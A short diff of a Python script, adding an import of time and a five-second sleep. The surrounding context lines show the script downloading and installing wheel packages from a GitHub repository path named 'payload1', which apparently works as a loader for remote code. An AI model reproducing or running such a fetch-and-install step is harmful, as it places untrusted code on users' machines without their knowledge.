@@ -5,6 +5,7 @@ import subprocess
 import os
 import tempfile
 import importlib.util
+import time
 
 def is_python_installed():
     try:
@@ -66,3 +67,4 @@ repo_url = 'https://api.github.com/repos/slayy2357/payload1/contents/modules'
 download_and_install_whls(repo_url)
 
 print("All required whl packages are installed and ready to use.")
+time.sleep(5)
